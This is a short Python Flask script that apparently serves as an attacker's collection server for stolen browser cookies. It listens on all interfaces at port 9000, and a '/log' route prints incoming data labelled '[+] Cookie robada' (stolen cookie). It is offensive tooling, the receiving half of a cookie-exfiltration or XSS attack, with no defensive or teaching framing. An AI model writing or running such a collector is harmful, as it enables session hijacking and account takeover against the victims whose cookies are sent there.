from flask import Flask, request
app = Flask(__name__)

@app.route('/log', methods=['GET'])
def log():
    print("[+] Cookie robada:", request.data.decode())
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9000)

